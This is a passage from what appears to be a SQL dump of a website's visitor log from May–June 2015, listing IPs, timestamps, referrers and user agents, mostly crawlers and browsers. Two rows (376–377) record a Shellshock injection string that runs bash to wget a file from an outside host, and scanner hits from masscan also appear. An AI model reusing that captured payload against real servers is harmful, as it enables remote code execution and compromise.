SV1)'),(334,'112.216.179.210','2015-05-12','11:12:14','','Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D257 Safari/9537.53'),(335,'210.216.54.2','2015-05-12','13:12:21','','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36'),(336,'1.169.93.94','2015-05-12','13:50:20','',''),(337,'188.138.17.205','2015-05-12','15:57:33','',''),(338,'69.30.240.46','2015-05-12','16:24:39','',''),(339,'182.118.53.165','2015-05-13','01:27:22','','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36'),(340,'60.21.141.42','2015-05-13','03:31:14','','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)'),(341,'1.169.93.42','2015-05-13','03:59:57','',''),(342,'192.99.40.137','2015-05-13','20:29:59','http://domainsigma.com/whois/jubinna.com','Mozilla/5.0 (compatible; DomainSigmaCrawler/0.1; +http://domainsigma.com/robot)'),(343,'52.8.65.183','2015-05-13','22:13:40','','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; InfoPath.2)'),(344,'50.28.106.133','2015-05-13','22:17:52','','Mozilla/5.0 (Windows NT 6.3;compatible; Leikibot/1.0; +http://www.leiki.com)'),(345,'1.161.57.220','2015-05-13','23:43:38','',''),(346,'60.21.141.42','2015-05-14','01:31:05','','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)'),(347,'68.168.96.81','2015-05-14','03:05:22','','masscan/1.0 (https://github.com/robertdavidgraham/masscan)'),(348,'78.47.155.198','2015-05-14','06:23:12','','Mozilla/5.0 (compatible; Digincore bot; https://www.digincore.com/crawler.html for rules and instructions.'),(349,'157.55.39.123','2015-05-14','08:37:20','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(350,'1.164.39.200','2015-05-14','09:23:03','',''),(351,'111.251.52.123','2015-05-14','09:29:06','',''),(352,'61.240.144.66','2015-05-14','14:32:10','','masscan/1.0 (https://github.com/robertdavidgraham/masscan)'),(353,'112.216.179.210','2015-05-14','16:48:21','','Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D257 Safari/9537.53'),(354,'118.165.132.231','2015-05-14','20:15:35','',''),(355,'1.163.71.206','2015-05-14','23:09:51','',''),(356,'182.118.54.34','2015-05-15','00:48:43','','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36'),(357,'106.39.95.194','2015-05-15','07:05:20','','Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.13 (KHTML, like Gecko) Chrome/9.0.597.98 Safari/534.13'),(358,'182.118.55.232','2015-05-15','07:21:07','','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36'),(359,'182.118.60.116','2015-05-15','07:39:27','','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36'),(360,'157.55.39.122','2015-05-15','10:19:38','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(361,'1.161.61.147','2015-05-15','12:53:24','',''),(362,'94.23.217.201','2015-05-15','16:41:02','','Mozilla/5.0 (Windows NT 6.1; rv:34.0) Gecko/20100101 Firefox/34.0'),(363,'211.95.47.168','2015-05-15','16:42:29','',''),(364,'62.210.37.113','2015-05-15','16:49:10','','Mozilla/5.0 (Windows NT 6.1; rv:34.0) Gecko/20100101 Firefox/34.0'),(365,'111.251.51.211','2015-05-15','19:33:47','',''),(366,'210.13.94.157','2015-05-15','19:49:39','',''),(367,'38.100.21.66','2015-05-15','23:27:47','','Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.2)'),(368,'220.136.144.42','2015-05-16','02:24:58','',''),(369,'46.162.115.130','2015-05-16','08:54:38','','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36'),(370,'157.55.39.122','2015-05-16','11:42:39','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(371,'61.240.144.65','2015-05-16','11:45:25','','masscan/1.0 (https://github.com/robertdavidgraham/masscan)'),(372,'141.212.122.34','2015-05-16','17:19:48','',''),(373,'64.246.165.210','2015-05-16','18:15:27','http://whois.domaintools.com/jubinna.com','Mozilla/5.0 (Windows; U; Windows NT 5.1; en; rv:1.9.0.13) Gecko/2009073022 Firefox/3.5.2 (.NET CLR 3.5.30729) SurveyBot/2.3 (DomainTools)'),(374,'23.95.43.107','2015-05-16','21:11:52','','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.65 Safari/537.36'),(375,'157.55.39.123','2015-05-16','21:26:32','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(376,'66.54.155.61','2015-05-16','21:36:02','() { :;}; /bin/bash -c \"wget -O /tmp/bbb dprftp.asuscomm.com/novo.php?ip=3130362e3234352e3233332e3530\"','() { :;}; /bin/bash -c \"wget -O /tmp/bbb dprftp.asuscomm.com/novo.php?ip=3130362e3234352e3233332e3530\"'),(377,'200.7.193.107','2015-05-16','23:59:39','() { :;}; /bin/bash -c \"wget -O /tmp/bbb dprftp.asuscomm.com/novo.php?ip=3130362e3234352e3233332e3530\"','() { :;}; /bin/bash -c \"wget -O /tmp/bbb dprftp.asuscomm.com/novo.php?ip=3130362e3234352e3233332e3530\"'),(378,'182.118.53.171','2015-05-17','01:17:31','','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36'),(379,'182.118.54.103','2015-05-17','01:35:49','','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36'),(380,'1.161.18.63','2015-05-17','02:33:59','',''),(381,'141.212.122.98','2015-05-17','07:58:51','',''),(382,'1.163.70.247','2015-05-17','08:14:00','',''),(383,'182.118.54.34','2015-05-17','09:12:48','','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36'),(384,'157.55.39.123','2015-05-17','10:10:53','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(385,'111.251.52.248','2015-05-17','18:32:43','',''),(386,'118.165.134.182','2015-05-17','21:06:54','',''),(387,'112.221.70.78','2015-05-18','06:12:11','','Mozilla/5.0 (Linux; Android 4.4.2; ko-kr; SAMSUNG SM-N900S Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/1.5 Chrome/28.0.1500.94 Mobile Safari/537.36'),(388,'157.55.39.123','2015-05-18','08:51:21','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(389,'188.138.9.50','2015-05-18','09:33:47','',''),(390,'217.12.204.104','2015-05-18','23:22:12','http://burger-imperia.com/','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.120 Safari/537.36'),(391,'182.118.60.30','2015-05-19','02:23:45','','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36'),(392,'185.35.62.11','2015-05-19','03:26:07','',''),(393,'182.118.55.133','2015-05-19','09:09:38','','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36'),(394,'180.87.43.2','2015-05-19','10:16:08','',''),(395,'1.163.66.28','2015-05-19','12:03:23','',''),(396,'85.142.20.210','2015-05-19','15:17:34','','Mozilla/42.0 (compatible; MSIE 28.0; Win128)'),(397,'61.102.12.196','2015-05-19','18:23:15','','Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)'),(398,'60.21.141.42','2015-05-19','19:25:30','','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)'),(399,'141.212.121.152','2015-05-19','22:52:18','',''),(400,'118.165.130.202','2015-05-19','23:28:29','',''),(401,'61.102.92.100','2015-05-19','23:39:50','','Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Win64; x64; Trident/6.0; LEN2)'),(402,'157.55.39.123','2015-05-20','02:20:38','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(403,'62.173.145.229','2015-05-20','03:55:38','http://jubinna.com/','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)'),(404,'85.142.20.210','2015-05-20','04:29:10','','Mozilla/42.0 (compatible; MSIE 28.0; Win128)'),(405,'60.21.141.42','2015-05-20','06:15:13','','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)'),(406,'211.36.147.126','2015-05-20','09:47:42','','Mozilla/5.0 (Linux; Android 5.0.1; SM-N910L Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36'),(407,'1.169.94.129','2015-05-20','15:51:49','',''),(408,'1.161.58.80','2015-05-20','16:57:15','',''),(409,'192.99.40.137','2015-05-20','18:26:36','http://domainsigma.com/whois/jubinna.com','Mozilla/5.0 (compatible; DomainSigmaCrawler/0.1; +http://domainsigma.com/robot)'),(410,'182.118.60.39','2015-05-21','02:44:41','','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36'),(411,'38.99.82.191','2015-05-21','03:51:35','','Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Qt/4.7.1 Safari/533.3'),(412,'60.21.141.42','2015-05-21','03:58:40','','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)'),(413,'112.221.70.74','2015-05-21','04:57:13','','Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko'),(414,'182.118.53.49','2015-05-21','09:26:55','','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36'),(415,'157.55.39.123','2015-05-21','16:29:57','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(416,'23.95.190.30','2015-05-21','16:55:21','http://best-seo-report.com','Mozilla/4.0 (compatible; Synapse)'),(417,'38.99.82.235','2015-05-21','19:15:48','','Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Qt/4.7.1 Safari/533.3'),(418,'188.40.109.147','2015-05-21','19:37:28','','Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)'),(419,'104.128.144.130','2015-05-21','19:44:30','','probethenet.com scanner'),(420,'61.102.92.100','2015-05-21','20:05:42','','Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Win64; x64; Trident/6.0; LEN2)'),(421,'175.45.218.48','2015-05-21','22:16:23','',''),(422,'38.99.82.191','2015-05-22','00:23:19','','Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Qt/4.7.1 Safari/533.3'),(423,'69.30.240.46','2015-05-22','01:56:59','',''),(424,'60.21.141.42','2015-05-22','02:10:18','','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)'),(425,'38.99.82.235','2015-05-22','02:10:19','','Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Qt/4.7.1 Safari/533.3'),(426,'61.240.144.65','2015-05-22','03:38:24','','masscan/1.0 (https://github.com/robertdavidgraham/masscan)'),(427,'89.72.25.38','2015-05-22','04:45:01','','x00_-gawa.sa.pilipinas.2015'),(428,'207.46.13.73','2015-05-22','05:33:10','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(429,'157.55.39.229','2015-05-22','05:34:32','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(430,'157.55.39.248','2015-05-22','05:37:54','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(431,'89.248.171.32','2015-05-22','05:44:55','','Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)'),(432,'157.55.39.69','2015-05-22','05:49:48','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(433,'157.55.39.122','2015-05-22','06:11:42','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(434,'54.163.161.192','2015-05-22','06:34:15','','Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 GTB6 (.NET CLR 3.5.30729)'),(435,'199.58.86.209','2015-05-22','08:59:45','','Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)'),(436,'212.83.177.193','2015-05-22','14:55:40','','Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)'),(437,'141.212.122.2','2015-05-22','15:42:04','',''),(438,'157.55.39.123','2015-05-22','20:11:20','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(439,'142.4.214.124','2015-05-22','20:36:29','','Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)'),(440,'61.120.154.80','2015-05-23','00:27:37','',''),(441,'182.118.55.210','2015-05-23','00:57:48','','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36'),(442,'60.21.141.42','2015-05-23','01:33:50','','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)'),(443,'182.118.53.143','2015-05-23','07:45:52','','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36'),(444,'176.9.4.172','2015-05-23','12:26:39','','Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)'),(445,'216.107.155.114','2015-05-23','20:11:54','','Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)'),(446,'157.55.39.225','2015-05-23','22:10:32','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(447,'71.176.122.34','2015-05-24','03:25:44','','Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)'),(448,'157.55.39.151','2015-05-24','05:29:40','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(449,'157.55.39.27','2015-05-24','05:36:20','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(450,'188.165.6.238','2015-05-24','05:39:46','','\"nlpproject.info research\"'),(451,'38.99.82.191','2015-05-24','09:58:04','','Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Qt/4.7.1 Safari/533.3'),(452,'60.21.141.42','2015-05-24','10:11:00','','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)'),(453,'157.55.39.152','2015-05-24','11:02:14','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(454,'209.126.117.84','2015-05-24','15:36:17','','Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)'),(455,'207.46.13.142','2015-05-24','20:42:21','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(456,'157.55.39.151','2015-05-25','01:07:43','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(457,'207.46.13.142','2015-05-25','01:47:01','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(458,'182.118.53.172','2015-05-25','02:38:13','','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36'),(459,'157.55.39.97','2015-05-25','02:52:31','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(460,'157.55.39.152','2015-05-25','07:01:09','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(461,'182.118.45.237','2015-05-25','08:30:27','','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36'),(462,'106.245.233.50','2015-05-25','13:41:40','','Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:35.0) Gecko/20100101 Firefox/35.0'),(463,'110.70.26.155','2015-05-25','14:03:49','','Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) CriOS/42.0.2311.47 Mobile/11D257 Safari/9537.53'),(464,'209.134.90.11','2015-05-25','15:58:32','','x00_-gawa.sa.pilipinas.2015'),(465,'72.4.189.178','2015-05-25','19:22:31','','x00_-gawa.sa.pilipinas.2015'),(466,'157.55.39.152','2015-05-26','02:54:06','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(467,'157.55.39.27','2015-05-26','02:54:10','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(468,'185.35.62.11','2015-05-26','03:02:59','',''),(469,'46.4.32.75','2015-05-26','04:35:14','','Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)'),(470,'61.240.144.64','2015-05-26','06:37:48','','masscan/1.0 (https://github.com/robertdavidgraham/masscan)'),(471,'157.55.39.151','2015-05-26','07:05:25','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(472,'210.216.54.2','2015-05-26','07:31:31','','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36'),(473,'49.143.208.117','2015-05-26','11:19:02','',''),(474,'61.102.12.196','2015-05-26','15:18:41','','Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)'),(475,'76.187.228.148','2015-05-26','15:51:45','','Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)'),(476,'207.46.13.142','2015-05-26','16:24:47','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(477,'94.22.124.190','2015-05-26','17:38:29','','Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)'),(478,'157.55.39.103','2015-05-26','21:10:20','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(479,'61.102.92.100','2015-05-26','21:17:46','','Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Win64; x64; Trident/6.0; LEN2)'),(480,'182.118.60.95','2015-05-27','01:03:06','','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36'),(481,'209.126.117.84','2015-05-27','01:10:44','','Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)'),(482,'157.55.39.151','2015-05-27','04:59:01','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(483,'211.137.34.206','2015-05-27','05:49:04','',''),(484,'182.118.60.39','2015-05-27','09:25:34','','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36'),(485,'91.121.89.151','2015-05-27','17:44:52','','Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)'),(486,'109.87.45.70','2015-05-27','18:23:07','','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)'),(487,'23.95.190.30','2015-05-27','20:21:10','http://best-seo-report.com','Mozilla/4.0 (compatible; Synapse)'),(488,'168.63.126.251','2015-05-27','21:24:06','','python-requests/2.5.1 CPython/2.7.6 Windows/2008ServerR2'),(489,'192.99.150.120','2015-05-27','22:04:39','http://domainsigma.com/whois/jubinna.com','Mozilla/5.0 (compatible; DomainSigmaCrawler/0.1; +http://domainsigma.com/robot)'),(490,'52.25.167.184','2015-05-27','23:17:20','','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; InfoPath.2)'),(491,'157.55.39.90','2015-05-28','05:20:26','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(492,'78.46.50.246','2015-05-28','05:32:49','','Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)'),(493,'148.251.124.174','2015-05-28','07:59:25','','Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)'),(494,'112.216.179.210','2015-05-28','14:27:06','','Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) CriOS/42.0.2311.47 Mobile/11D257 Safari/9537.53'),(495,'60.21.141.42','2015-05-28','15:36:04','','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)'),(496,'182.118.53.70','2015-05-29','01:52:47','','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36'),(497,'60.21.141.42','2015-05-29','02:28:27','','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)'),(498,'36.229.80.157','2015-05-29','04:26:11','',''),(499,'182.118.45.227','2015-05-29','07:34:19','','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36'),(500,'141.212.122.154','2015-05-29','08:53:04','',''),(501,'157.55.39.91','2015-05-29','09:43:28','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(502,'210.216.54.2','2015-05-29','10:01:34','','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36'),(503,'168.63.126.251','2015-05-29','16:49:27','','Mozilla/5.0 (Windows NT 5.1; rv:33.0) Gecko/20100101 Firefox/33.0'),(504,'111.248.115.171','2015-05-29','17:19:45','',''),(505,'111.113.13.214','2015-05-29','19:54:13','http://www.baidu.com/','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)'),(506,'141.212.122.50','2015-05-29','20:42:39','',''),(507,'157.55.39.90','2015-05-29','23:21:51','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(508,'60.21.141.42','2015-05-30','00:12:17','','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)'),(509,'162.210.196.129','2015-05-30','00:35:58','','Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)'),(510,'114.44.58.9','2015-05-30','00:44:35','',''),(511,'141.212.122.194','2015-05-30','02:18:49','',''),(512,'176.36.80.39','2015-05-30','04:15:24','','Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)'),(513,'93.174.93.239','2015-05-30','10:23:09','','Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0'),(514,'157.55.39.91','2015-05-30','12:57:42','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(515,'64.246.161.42','2015-05-30','13:54:32','http://whois.domaintools.com/jubinna.com','Mozilla/5.0 (Windows; U; Windows NT 5.1; en; rv:1.9.0.13) Gecko/2009073022 Firefox/3.5.2 (.NET CLR 3.5.30729) SurveyBot/2.3 (DomainTools)'),(516,'136.243.5.215','2015-05-30','15:44:04','','Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)'),(517,'36.229.237.35','2015-05-30','17:10:03','',''),(518,'207.46.13.19','2015-05-30','17:10:50','','msnbot-media/1.1 (+http://search.msn.com/msnbot.htm)'),(519,'157.55.39.3','2015-05-30','18:12:07','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(520,'141.212.122.146','2015-05-30','21:35:07','',''),(521,'157.55.39.90','2015-05-30','22:06:29','','msnbot-media/1.1 (+http://search.msn.com/msnbot.htm)'),(522,'157.55.39.8','2015-05-30','23:38:52','','msnbot-media/1.1 (+http://search.msn.com/msnbot.htm)'),(523,'157.55.39.90','2015-05-31','01:41:42','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(524,'182.118.53.240','2015-05-31','02:04:28','','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36'),(525,'182.118.60.25','2015-05-31','06:55:09','','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36'),(526,'63.141.251.190','2015-05-31','07:19:42','','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36'),(527,'111.248.62.217','2015-05-31','09:24:58','',''),(528,'60.21.141.42','2015-05-31','09:44:18','','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)'),(529,'89.248.172.27','2015-05-31','11:51:14','',''),(530,'114.44.59.217','2015-05-31','16:00:48','',''),(531,'64.79.100.11','2015-05-31','16:33:36','http://www.jubinna.com','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'),(532,'61.228.91.98','2015-06-01','04:53:32','',''),(533,'36.229.234.42','2015-06-01','05:14:22','',''),(534,'5.9.85.4','2015-06-01','06:43:25','','Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)'),(535,'60.21.141.42','2015-06-01','07:24:47','','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)'),(536,'157.55.39.85','2015-06-01','08:59:03','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(537,'111.248.114.98','2015-06-01','11:21:59','',''),(538,'192.99.152.198','2015-06-01','11:33:29','','Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)'),(539,'157.55.39.105','2015-06-01','12:36:07','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(540,'157.55.39.174','2015-06-01','12:39:11','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(541,'111.248.112.129','2015-06-01','14:11:29','',''),(542,'185.35.62.11','2015-06-02','03:12:30','',''),(543,'119.237.126.109','2015-06-02','04:17:50','',''),(544,'111.248.59.9','2015-06-02','04:43:32','',''),(545,'104.255.65.11','2015-06-02','06:51:46','','Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)'),(546,'178.19.104.138','2015-06-02','06:58:32','',''),(547,'63.141.253.226','2015-06-02','08:13:47','','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36'),(548,'89.248.172.27','2015-06-02','14:07:27','',''),(549,'157.55.39.174','2015-06-02','14:47:32','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(550,'23.95.190.30','2015-06-02','17:13:57','http://best-seo-report.com','Mozilla/4.0 (compatible; Synapse)'),(551,'111.248.115.161','2015-06-02','17:35:53','',''),(552,'185.44.79.28','2015-06-02','18:23:05','','Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:16.0.1) Gecko/20121011 Firefox/21.0.1'),(553,'207.46.13.71','2015-06-02','19:34:05','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(554,'60.21.141.42','2015-06-02','20:51:53','','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; 